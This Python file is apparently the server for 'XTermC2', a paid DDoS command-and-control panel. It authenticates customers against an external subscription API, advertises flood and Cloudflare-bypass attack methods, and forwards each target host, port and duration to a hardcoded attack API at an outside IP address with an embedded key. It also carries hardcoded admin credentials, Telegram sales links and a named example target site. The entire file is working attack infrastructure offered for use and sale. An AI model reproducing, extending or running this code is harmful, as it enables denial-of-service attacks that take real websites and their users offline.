import socket
import os
import subprocess
import sys
import time, requests
from pystyle import*
if not os.path.exists('alluser'):
    with open('alluser', 'w', encoding='utf-8') as f:
        pass
USERNAME = "Admin"
PASSWORD = "admin"
online = {}
def avt():
    ax = "\nChannel : [t.me/xtermc2power]   •   Chat : [t.me/XTermc2Chat]"
    banner = f"""{ax}
    ╔{'═' * 50}╗
    ║⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿║
    ║⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿║
    ║⣿⣿⣿⣿⣿⣿⣏⠉⢻⣿⠏⣉⣉⡉⠉⣩⡭⠉⢉⣉⣉⣭⡍⠉⣍⠉⠻⣿⠉⠉⢹⣿⠏⠉⠉⣽⠏⢉⣩⣭⣭⡟⣫⡍⠙⣿⣿⣿⣿⣿║
    ║⣿⣿⣿⣿⣿⣿⣿⡆⠀⢡⣾⣿⣿⠃⢠⣿⠇⠀⢛⣛⣻⣿⠁⠸⠿⠁⣠⡏⠀⣇⠸⠃⣠⠇⣸⠃⠀⣾⣿⣿⣿⡶⠛⢁⣴⣿⣿⣿⣿⣿║
    ║⣿⣿⣿⣿⣿⡿⠋⣠⡆⠈⢿⣿⡏⠀⣸⣿⠀⠘⠛⠛⢛⡏⠀⣷⡆⠈⣿⠁⣸⣿⠀⣰⡿⠀⣿⣄⠈⠻⠿⢟⡛⠀⠰⠿⢿⣿⣿⣿⣿⣿║
    ║⣿⣿⣿⣿⣿⣶⣿⣿⣿⣦⡀⠙⢒⣺⣿⣿⣷⣶⣿⣿⣷⣶⣿⣿⣇⡀⢛⣓⣽⣿⣷⣿⣷⣿⣿⣿⣷⣶⣾⣿⣷⣿⣿⣾⣿⣿⣿⣿⣿⣿║
    ║⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿║
    ║⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿║
    ╚{'═' * 50}╝
use 'help' please !"""
    return Colorate.Vertical(Colors.DynamicMIX((Col.cyan, Col.purple)), Center.XCenter(banner.center(100))) + "\n\n"

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')
    return b''
def banner():
    return "Welcome to the server!\n"
def cl(string):
    return Colorate.Diagonal(Colors.DynamicMIX((Col.cyan, Col.purple)), string) + "\n"
def cl2(string):
	return Colorate.Diagonal(Colors.DynamicMIX((Col.white, Col.red)), string) + "\n"
def cl3(string):
	return Colorate.Diagonal(Colors.DynamicMIX((Col.white, Col.green)), string) + "\n"
def cl4(string):
	return Colorate.Diagonal(Colors.DynamicMIX((Col.gray, Col.white)), string) + "\n"
def xterm(user):
    return f"\033[1;41mXTermC2 ● {user} \033[0m\033[1;37m ▸ "
def change_value_user(value):
    new_content = []
    with open('alluser', 'r') as file:
        try:
            for line in file:
                if value in line:
                    continue
                new_content.append(line)
            with open('alluser', 'w') as file:
                file.write("".join(new_content))
        except:
            return False
def che_pass(password):
    hehe = len(password) - 3
    cat = password[-3:]
    haha = hehe * "*" + cat
    return haha
def handle_client(client_socket, ip_user):
    if not os.path.exists(str(ip_user)):
        client_socket.send(banner().encode())
        client_socket.send("Enter username: ".encode())
        username = client_socket.recv(1024).decode().strip()
        client_socket.send("Enter password: ".encode())
        password = client_socket.recv(1024).decode().strip()
        open(str(ip_user), 'w', encoding='utf-8').write(username+":"+password)
    code = open('alluser', 'r', encoding='utf-8').read().splitlines()
    dc = open(str(ip_user), 'r', encoding='utf-8').read()
    user, password = dc.split(':')
    c = requests.get('http://xtermc2.pythonanywhere.com/check?user={}&pass={}&ip={}'.format(user, password, str(ip_user))).json()
    def client_main():
        client_socket.send("Login successful!\n".encode())
        __import__('time').sleep(1)
        client_socket.send(clear())
        client_socket.send(b"\x1b[2J\x1b[H")
        client_socket.send(avt().encode())
        if user == USERNAME:
            plan = "Legendary"
        else:
            plan = c['plan']
        teo = open('alluser', 'r', encoding='utf-8').read().splitlines()
        title_escape_sequence = f"\x1b]2;[\] XTermC2 | Online: [{len(online)}/{len(teo)}] | User: {user} | Plan: {plan} \x07"
        client_socket.sendall(title_escape_sequence.encode())
        #client_socket.send(xterm().encode())
        while True:
            client_socket.send(xterm(user).encode())
            data = client_socket.recv(1024).decode()
            if not data:
                print(f"Đóng sever {ip_user}")
                del online[ip_user]
                break
            print(f"Received command: {data}")

            if data.strip().lower() == "help":
                response = "Available commands\n● methods | To show all methods Attack !\n● admin | To contact admin buy script - api - source C2!\n● clear | To clear all terminal !\n"
                client_socket.send(cl4(response).encode())
               # client_socket.send(f"\033[0;30;47mXTermC2 ● {USERNAME} \033[0m\033[1;37m ▸ ".encode())
            elif data.strip().lower() == "clear":
                response = ""
                client_socket.send(b"\x1b[2J\x1b[H")
                client_socket.send(avt().encode())
            elif data.strip().lower() == "info":
                response = ""
                if user == USERNAME:
                    client_socket.send(cl("Admin : Bùi Văn Phát (XTerm_BvP)\nYour Info:\n[User]: Admin\n[Expired]: Null\n[Plan]: Legendary\nTime Use API : 30days\nAttack Max Time : 120s\ncons : 2").encode())
                else:
                    client_socket.send(cl(f"Your Info:\n[User]: {c['user']}\n[Password]: {che_pass(c['password'])}\n[Plan]: {c['plan']}\n[Expired]: {c['expiry_date']}\n[Remaining]: {c['date']}").encode())
            elif data.strip().lower() == "methods":
                response = "Supported methods for XTermC2\n● HTTPS - 1/2 HTTP BYPASS CLF UAM !\n● FLOOD - SUPER V3 FLOOD KILL !\n● BYPASS - TO BYPASS CLF DOWN !\n● BROWSER - HIGH RQ/Sencond To Down Fast !\nUse Attack : [HOST] [PORT] [TIME]"
                client_socket.send(cl3(response).encode())
            elif data.strip().lower() == "admin":
                response = "Admin XTerm_BvP\nTelegram : t.me/XTermBvP7"
                client_socket.send(cl2(response).encode())
             #   client_socket.send(f"\033[0;30;47mXTermC2 ● {USERNAME} \033[0m\033[1;37m ▸ ".encode())
             
            elif data.startswith("HTTPS"):
                try:
                    parts = data.split()
                    url = parts[1]
                    port = parts[2]
                    time = parts[3]
                except:
                    client_socket.send(cl("Pls Using Example: HTTPS https://khoidesign.com 60").encode())
                    continue
                script_command = requests.get(f"http://116.103.229.134/api.php?key=alphac2vip&host={url}&port={port}&time={time}&method=HTTPS")
                if script_command.status_code == 200:
                	client_socket.send(cl2(f"Attack sent successfully!\nMethod use: HTTPS\nTarget: {url}\nPort: {port}\nDuration: {time}\nAttack sent by : {user}").encode())
                else:
                	client_socket.send(cl2(f"Attack Error ! "))
                response = ""
                None
            elif data.startswith("FLOOD"):
                try:
                    parts = data.split()
                    url = parts[1]
                    port = parts[2]
                    time = parts[3]
                except:
                    client_socket.send(cl("Pls Using Example: FLOOD https://khoidesign.com 60").encode())
                    continue
                script_command = requests.get(f"http://116.103.229.134/api.php?key=alphac2vip&host={url}&port={port}&time={time}&method=FLOOD")
                if script_command.status_code == 200:
                	client_socket.send(cl2(f"Attack sent successfully!\nMethod use: FLOOD\nTarget: {url}\nPort: {port}\nDuration: {time}\nAttack sent by : {user}").encode())
                else:
                	client_socket.send(cl2(f"Attack Error ! "))
            elif data.startswith("BYPASS"):
                try:
                    parts = data.split()
                    url = parts[1]
                    port = parts[2]
                    time = parts[3]
                except:
                    client_socket.send(cl("Pls Using Example: BYPASS https://khoidesign.com 60").encode())
                    continue
                script_command = requests.get(f"http://116.103.229.134/api.php?key=alphac2vip&host={url}&port={port}&time={time}&method=BYPASS")
                if script_command.status_code == 200:
                	client_socket.send(cl2(f"Attack sent successfully!\nMethod use: BYPASS\nTarget: {url}\nPort: {port}\nDuration: {time}\nAttack sent by : {user}").encode())
                else:
                	client_socket.send(cl2(f"Attack Error ! "))
            elif data.startswith("BROWSER"):
                try:
                    parts = data.split()
                    url = parts[1]
                    port = parts[2]
                    time = parts[3]
                except:
                    client_socket.send(cl("Pls Using Example: BROWSER https://khoidesign.com 60").encode())
                    continue
                script_command = requests.get(f"http://116.103.229.134/api.php?key=alphac2vip&host={url}&port={port}&time={time}&method=HTTP")
                if script_command.status_code == 200:
                	client_socket.send(cl2(f"Attack sent successfully!\nMethod use: BROWSER\nTarget: {url}\nPort: {port}\nDuration: {time}\nAttack sent by : {user}").encode())
                else:
                	client_socket.send(cl2(f"Attack Error ! "))
              
            else:
                response = "Invalid command\n"
            
        client_socket.send(xterm(user).encode())  

    if c['status'] == 'success':
        with open('alluser', 'r', encoding='utf-8') as x:
            if f'{user}:{password}' in x.read():
                pass
            else:
                open('alluser', 'a', encoding='utf-8').write(dc + '\n')
        online[ip_user] = 'online'
        client_main()
    elif user == USERNAME and password == PASSWORD:
        online[ip_user] = 'online'
        client_main()
        
    else:
        client_socket.send(str(c).encode())
        print(change_value_user(dc))
        os.remove(str(ip_user))
        #client_socket.send("Login failed. Connection closed.\n".encode())
        client_socket.close()
    

def main():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(("192.168.2.7", 9911))
    server.listen(5)
    print("[*] Server Hoạt Động")

    while True:
        client_socket, addr = server.accept()
        print(f"[*] Accepted connection from {addr[0]}:{addr[1]}")
        
        handle_client(client_socket, addr[0])

if __name__ == "__main__":
    main()